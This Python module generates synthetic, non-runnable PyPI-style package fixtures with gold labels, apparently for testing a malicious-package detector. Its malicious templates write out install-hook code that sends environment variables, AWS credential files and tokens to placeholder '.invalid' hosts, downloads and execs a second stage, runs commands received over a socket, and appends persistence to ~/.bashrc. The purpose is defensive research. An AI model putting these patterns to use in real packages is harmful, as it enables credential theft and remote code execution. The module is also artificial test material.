"""Synthetic, NON-EXECUTABLE package fixtures with planted behaviors and gold annotations.

Purpose: CPU smoke tests, and a small annotated set where gold behaviors and gold flow paths are
known (plan 5.1: "synthetic, non-executable fixtures to cover specifically annotated behavior paths
and benign uses of sensitive APIs"). They are strings, parsed with `ast`, never run. All hosts use
the reserved `.invalid` TLD or the documentation range 203.0.113.0/24, and payloads are inert.
Synthetic samples are labelled `label_source = synthetic_fixture` and must not be used for headline
claims about real malware.

Each template sets:
  gold_behaviors : behaviors that a correct explanation may claim
  gold_paths     : API sequences of the relational evidence (flows), [] when none
  difficulty     : direct | relational | interproc | obfuscated | unparsable | benign_sensitive | plain
"""
from __future__ import annotations

import base64
import random
from typing import Callable, Dict, List, Tuple

from ..schema import Sample, sha256_text
from .safe_io import files_from_texts

ADJ = ["fast", "tiny", "smart", "py", "easy", "open", "auto", "super", "quick", "data", "cloud", "micro", "simple", "neo"]
NOUN = ["utils", "config", "parser", "client", "logger", "toolkit", "helper", "colors", "sdk", "cache", "dates",
        "metrics", "crypto", "requests", "yaml", "json", "cli", "auth", "image", "sync"]
HOSTW = ["stats", "cdn", "update", "telemetry", "api", "mirror", "files", "sync", "edge", "relay"]


def _setup_py(name: str, version: str, mod: str, extra_top: str = "", imports: str = "") -> str:
    return (f"{imports}from setuptools import setup, find_packages\n\n{extra_top}"
            f"setup(\n    name=\"{name}\",\n    version=\"{version}\",\n    packages=find_packages(),\n"
            f"    description=\"{name} helpers\",\n)\n")


def _filler(rng: random.Random, mod: str) -> Dict[str, str]:
    """1-3 boring utility modules so packages are not single-file."""
    out = {}
    pool = [
        ("text.py", "import re\n\n\ndef slugify(value):\n    value = re.sub(r\"[^a-zA-Z0-9]+\", \"-\", value)\n"
                    "    return value.strip(\"-\").lower()\n\n\ndef truncate(value, n=80):\n"
                    "    return value if len(value) <= n else value[: n - 3] + \"...\"\n"),
        ("mathx.py", "def clamp(x, lo, hi):\n    return max(lo, min(hi, x))\n\n\ndef mean(xs):\n"
                     "    xs = list(xs)\n    return sum(xs) / len(xs) if xs else 0.0\n"),
        ("dates.py", "import datetime\n\n\ndef today_iso():\n    return datetime.date.today().isoformat()\n\n\n"
                     "def parse(s):\n    return datetime.datetime.strptime(s, \"%Y-%m-%d\")\n"),
        ("colors.py", "RESET = \"\\033[0m\"\n\n\ndef red(s):\n    return \"\\033[31m\" + s + RESET\n\n\n"
                      "def green(s):\n    return \"\\033[32m\" + s + RESET\n"),
        ("cache.py", "import functools\n\n\ndef memo(fn):\n    return functools.lru_cache(maxsize=128)(fn)\n"),
    ]
    for fn, code in rng.sample(pool, rng.randint(1, 3)):
        out[f"{mod}/{fn}"] = code
    return out


# ------------------------------------------------------------------ malicious templates
def m_env_exfil_setup(rng, name, ver, mod, host):
    top = ("def _report():\n"
           "    payload = base64.b64encode(str(dict(os.environ)).encode())\n"
           f"    req = urllib.request.Request(\"http://{host}/collect\", data=payload)\n"
           "    urllib.request.urlopen(req, timeout=3)\n\n\n_report()\n\n")
    files = {"setup.py": _setup_py(name, ver, mod, top, "import os\nimport base64\nimport urllib.request\n"),
             f"{mod}/__init__.py": "from .text import slugify  # noqa\n"}
    return files, dict(gold_behaviors=["env_access", "obfuscation", "network_send", "data_exfiltration", "install_hook"],
                       gold_paths=[["os.environ", "base64.b64encode", "urllib.request.urlopen"]], difficulty="direct")


def m_cred_file_exfil(rng, name, ver, mod, host):
    files = {"setup.py": _setup_py(name, ver, mod),
             f"{mod}/__init__.py": "from .sync import sync\n\nsync()\n",
             f"{mod}/sync.py": ("import os\nimport requests\n\n\ndef _load_profile():\n"
                                "    path = os.path.expanduser(\"~/.aws/credentials\")\n"
                                "    with open(path) as fh:\n        return fh.read()\n\n\n"
                                "def sync():\n    data = _load_profile()\n"
                                f"    requests.post(\"https://{host}/api/v1/upload\", data={{\"blob\": data}}, timeout=5)\n")}
    return files, dict(gold_behaviors=["file_read", "sensitive_data", "network_send", "data_exfiltration"],
                       gold_paths=[["builtins.open", "requests.post"]], difficulty="interproc")


def m_download_exec(rng, name, ver, mod, host):
    files = {"setup.py": _setup_py(name, ver, mod),
             f"{mod}/__init__.py": ("import urllib.request\n\n\ndef _bootstrap():\n"
                                    f"    code = urllib.request.urlopen(\"http://{host}/stage2.py\").read()\n"
                                    "    exec(compile(code, \"<string>\", \"exec\"))\n\n\n_bootstrap()\n")}
    return files, dict(gold_behaviors=["network_download", "code_exec", "download_exec"],
                       gold_paths=[["urllib.request.urlopen", "builtins.compile", "builtins.exec"]], difficulty="direct")


def m_obfuscated_exec(rng, name, ver, mod, host):
    inert = "print('installation complete for %s')\n" % name + "# " + " ".join(rng.choice(NOUN) for _ in range(12))
    blob = base64.b64encode(inert.encode()).decode()
    top = f"_b = \"{blob}\"\nexec(base64.b64decode(_b))\n\n"
    files = {"setup.py": _setup_py(name, ver, mod, top, "import base64\n"),
             f"{mod}/__init__.py": ""}
    return files, dict(gold_behaviors=["obfuscation", "code_exec", "install_hook"],
                       gold_paths=[["base64.b64decode", "builtins.exec"]], difficulty="obfuscated")


def m_sysinfo_beacon(rng, name, ver, mod, host):
    files = {"setup.py": _setup_py(name, ver, mod),
             f"{mod}/__init__.py": "from .telemetry import _beacon\n\n_beacon()\n",
             f"{mod}/telemetry.py": ("import json\nimport getpass\nimport platform\nimport socket\nimport requests\n\n\n"
                                     "def _beacon():\n"
                                     "    info = {\"host\": socket.gethostname(), \"user\": getpass.getuser(),\n"
                                     "            \"os\": platform.platform()}\n"
                                     f"    requests.get(\"http://{host}/b\", params={{\"d\": json.dumps(info)}}, timeout=3)\n")}
    return files, dict(gold_behaviors=["system_info", "network_send", "data_exfiltration"],
                       gold_paths=[["socket.gethostname", "requests.get"]], difficulty="relational")


def m_remote_command(rng, name, ver, mod, host):
    ip = f"203.0.113.{rng.randint(2, 250)}"
    files = {"setup.py": _setup_py(name, ver, mod),
             f"{mod}/__init__.py": "from .worker import poll  # noqa\n",
             f"{mod}/worker.py": ("import socket\nimport subprocess\n\n\ndef poll():\n"
                                  f"    s = socket.create_connection((\"{ip}\", 8443))\n"
                                  "    cmd = s.recv(1024).decode()\n"
                                  "    subprocess.Popen(cmd, shell=True)\n")}
    return files, dict(gold_behaviors=["network_connect", "network_download", "process_exec", "download_exec"],
                       gold_paths=[["socket.create_connection.recv", "subprocess.Popen"]], difficulty="relational")


def m_persistence(rng, name, ver, mod, host):
    files = {"setup.py": _setup_py(name, ver, mod, "", ""),
             f"{mod}/__init__.py": "from .agent import _persist\n\n_persist()\n",
             f"{mod}/agent.py": ("import os\n\n\ndef _persist():\n"
                                 "    rc = os.path.expanduser(\"~/.bashrc\")\n"
                                 "    with open(rc, \"a\") as fh:\n"
                                 f"        fh.write(\"\\n# {name}\\npython -m {mod}.agent &\\n\")\n")}
    return files, dict(gold_behaviors=["file_write", "persistence"], gold_paths=[], difficulty="direct")


def m_py2_exfil(rng, name, ver, mod, host):
    files = {"setup.py": ("import os, urllib2\nfrom distutils.core import setup\n"
                          "print \"installing\"\n"
                          "key = os.environ.get(\"AWS_SECRET_ACCESS_KEY\", \"\")\n"
                          f"urllib2.urlopen(\"http://{host}/k?v=\" + key)\n"
                          f"setup(name=\"{name}\", version=\"{ver}\", packages=[\"{mod}\"])\n"),
             f"{mod}/__init__.py": ""}
    return files, dict(gold_behaviors=["env_access", "network_send", "data_exfiltration", "install_hook"],
                       gold_paths=[["os.environ.get", "urllib2.urlopen"]], difficulty="unparsable")


def m_split_modules(rng, name, ver, mod, host):
    files = {"setup.py": _setup_py(name, ver, mod),
             f"{mod}/__init__.py": "from .collect import collect\nfrom .report import send\n\nsend(collect())\n",
             f"{mod}/collect.py": "import os\n\n\ndef collect():\n    return {k: v for k, v in os.environ.items() if \"TOKEN\" in k}\n",
             f"{mod}/report.py": ("import json\nimport requests\n\n\ndef send(obj):\n"
                                  f"    requests.post(\"https://{host}/r\", data=json.dumps(obj), timeout=5)\n")}
    return files, dict(gold_behaviors=["env_access", "network_send", "data_exfiltration"],
                       gold_paths=[["os.environ.items", "requests.post"]], difficulty="interproc")


# ------------------------------------------------------------------ benign templates
def b_http_client(rng, name, ver, mod, host):
    files = {"setup.py": _setup_py(name, ver, mod),
             f"{mod}/__init__.py": "from .client import Client, load_config  # noqa\n",
             f"{mod}/client.py": ("import json\nimport requests\n\n\ndef load_config(path):\n"
                                  "    with open(path) as fh:\n        return json.load(fh)\n\n\n"
                                  "class Client:\n    def __init__(self, base_url):\n"
                                  "        self.base_url = base_url\n        self.session = requests.Session()\n\n"
                                  "    def get_item(self, item_id):\n"
                                  "        return self.session.get(f\"{self.base_url}/items/{item_id}\", timeout=10).json()\n\n"
                                  "    def create_item(self, payload):\n"
                                  "        return self.session.post(f\"{self.base_url}/items\", json=payload, timeout=10).json()\n")}
    return files, dict(gold_behaviors=[], gold_paths=[], difficulty="benign_sensitive")


def b_cli_git(rng, name, ver, mod, host):
    files = {"setup.py": _setup_py(name, ver, mod),
             f"{mod}/__init__.py": "",
             f"{mod}/version.py": ("import subprocess\n\n\ndef git_revision():\n    try:\n"
                                   "        out = subprocess.run([\"git\", \"rev-parse\", \"HEAD\"], capture_output=True, text=True)\n"
                                   "        return out.stdout.strip()\n    except OSError:\n        return \"unknown\"\n")}
    return files, dict(gold_behaviors=[], gold_paths=[], difficulty="benign_sensitive")


def b_env_settings(rng, name, ver, mod, host):
    files = {"setup.py": _setup_py(name, ver, mod),
             f"{mod}/__init__.py": "from .settings import DEBUG  # noqa\n",
             f"{mod}/settings.py": ("import os\nimport logging\n\n"
                                    f"DEBUG = os.environ.get(\"{mod.upper()}_DEBUG\", \"0\") == \"1\"\n"
                                    "LOG_LEVEL = os.getenv(\"LOG_LEVEL\", \"INFO\")\n"
                                    "logging.basicConfig(level=LOG_LEVEL)\n")}
    return files, dict(gold_behaviors=[], gold_paths=[], difficulty="benign_sensitive")


def b_image_b64(rng, name, ver, mod, host):
    files = {"setup.py": _setup_py(name, ver, mod),
             f"{mod}/__init__.py": "",
             f"{mod}/datauri.py": ("import base64\nimport mimetypes\n\n\ndef to_data_uri(path):\n"
                                   "    mime = mimetypes.guess_type(path)[0] or \"application/octet-stream\"\n"
                                   "    with open(path, \"rb\") as fh:\n"
                                   "        enc = base64.b64encode(fh.read()).decode()\n"
                                   "    return f\"data:{mime};base64,{enc}\"\n")}
    return files, dict(gold_behaviors=[], gold_paths=[], difficulty="benign_sensitive")


def b_dataset_download(rng, name, ver, mod, host):
    files = {"setup.py": _setup_py(name, ver, mod),
             f"{mod}/__init__.py": "",
             f"{mod}/datasets.py": ("import os\nimport urllib.request\n\n\ndef fetch(url, dest_dir=\"~/.cache/" + mod + "\"):\n"
                                    "    dest_dir = os.path.expanduser(dest_dir)\n    os.makedirs(dest_dir, exist_ok=True)\n"
                                    "    dest = os.path.join(dest_dir, os.path.basename(url))\n"
                                    "    if not os.path.exists(dest):\n        urllib.request.urlretrieve(url, dest)\n"
                                    "    return dest\n")}
    return files, dict(gold_behaviors=[], gold_paths=[], difficulty="benign_sensitive")


def b_build_cmdclass(rng, name, ver, mod, host):
    setup = ("from setuptools import setup, find_packages\nfrom setuptools.command.build_py import build_py\n\n\n"
             "class BuildWithLocales(build_py):\n    def run(self):\n        self.compile_catalogs()\n"
             "        super().run()\n\n    def compile_catalogs(self):\n        import glob\n"
             f"        for po in glob.glob(\"{mod}/locale/*/LC_MESSAGES/*.po\"):\n            print(\"compiling\", po)\n\n\n"
             f"setup(name=\"{name}\", version=\"{ver}\", packages=find_packages(), cmdclass={{\"build_py\": BuildWithLocales}})\n")
    files = {"setup.py": setup, f"{mod}/__init__.py": ""}
    return files, dict(gold_behaviors=[], gold_paths=[], difficulty="benign_sensitive")


def b_optin_telemetry(rng, name, ver, mod, host):
    files = {"setup.py": _setup_py(name, ver, mod),
             f"{mod}/__init__.py": "__version__ = \"%s\"\n" % ver,
             f"{mod}/telemetry.py": ("import os\nimport requests\n\nfrom . import __version__\n\n\ndef ping():\n"
                                     f"    if os.environ.get(\"{mod.upper()}_TELEMETRY\") == \"1\":\n"
                                     f"        requests.post(\"https://{host}/v\", json={{\"version\": __version__}}, timeout=2)\n")}
    return files, dict(gold_behaviors=[], gold_paths=[], difficulty="benign_sensitive")


def b_template_engine(rng, name, ver, mod, host):
    files = {"setup.py": _setup_py(name, ver, mod),
             f"{mod}/__init__.py": "from .engine import render  # noqa\n",
             f"{mod}/engine.py": ("def _compile(template):\n    lines = [\"def _render(ctx):\", \"    out = []\"]\n"
                                  "    for part in template.split(\"{{\"):\n"
                                  "        lines.append(\"    out.append(%r)\" % part)\n"
                                  "    lines.append(\"    return ''.join(out)\")\n    ns = {}\n"
                                  "    exec(compile(\"\\n\".join(lines), \"<template>\", \"exec\"), ns)\n"
                                  "    return ns[\"_render\"]\n\n\ndef render(template, **ctx):\n"
                                  "    return _compile(template)(ctx)\n")}
    return files, dict(gold_behaviors=[], gold_paths=[], difficulty="benign_sensitive")


def b_plain(rng, name, ver, mod, host):
    files = {"setup.py": _setup_py(name, ver, mod), f"{mod}/__init__.py": "from .text import slugify  # noqa\n"}
    return files, dict(gold_behaviors=[], gold_paths=[], difficulty="plain")


MALICIOUS: List[Callable] = [m_env_exfil_setup, m_cred_file_exfil, m_download_exec, m_obfuscated_exec, m_sysinfo_beacon,
                             m_remote_command, m_persistence, m_py2_exfil, m_split_modules]
BENIGN: List[Callable] = [b_http_client, b_cli_git, b_env_settings, b_image_b64, b_dataset_download, b_build_cmdclass,
                          b_optin_telemetry, b_template_engine, b_plain]


def make_synthetic(n: int, seed: int = 0, malicious_frac: float = 0.4, campaigns: int = 3) -> List[Sample]:
    """n samples, deterministic in `seed`. `family_group` = template + campaign, so near-identical
    packages share a group and the grouped splitter keeps them together."""
    rng = random.Random(seed)
    out: List[Sample] = []
    n_mal = int(round(n * malicious_frac))
    for i in range(n):
        is_mal = i < n_mal
        tpl = (MALICIOUS if is_mal else BENIGN)[rng.randrange(len(MALICIOUS if is_mal else BENIGN))]
        camp = rng.randrange(campaigns)
        mod = f"{rng.choice(ADJ)}{rng.choice(NOUN)}{rng.randint(0, 99)}"
        name = mod.replace("_", "-")
        ver = f"{rng.randint(0, 3)}.{rng.randint(0, 20)}.{rng.randint(0, 9)}"
        host = f"{rng.choice(HOSTW)}{camp}.{rng.choice(NOUN)}.example.invalid"   # no template / label hint
        files, gold = tpl(rng, name, ver, mod, host)
        files.update(_filler(rng, mod))
        fl = files_from_texts(files)
        sha = sha256_text("\n".join(f"{f.path}:{f.sha256}" for f in fl))
        out.append(Sample(
            sample_id=f"syn-{seed}-{i:04d}-{name}", package_name=name, version=ver,
            label="malicious" if is_mal else "benign", files=fl, label_source="synthetic_fixture", sha256=sha,
            source_ref=f"synthetic:{n}:{seed}", family_group=f"{tpl.__name__}-c{camp}",
            collection_timestamp=f"2026-{1 + (i * 7) % 12:02d}-{1 + i % 28:02d}T00:00:00Z",
            meta={"template": tpl.__name__, "difficulty": gold["difficulty"]},
            gold={"gold_behaviors": gold["gold_behaviors"], "gold_paths": gold["gold_paths"]},
        ))
    rng.shuffle(out)
    return out
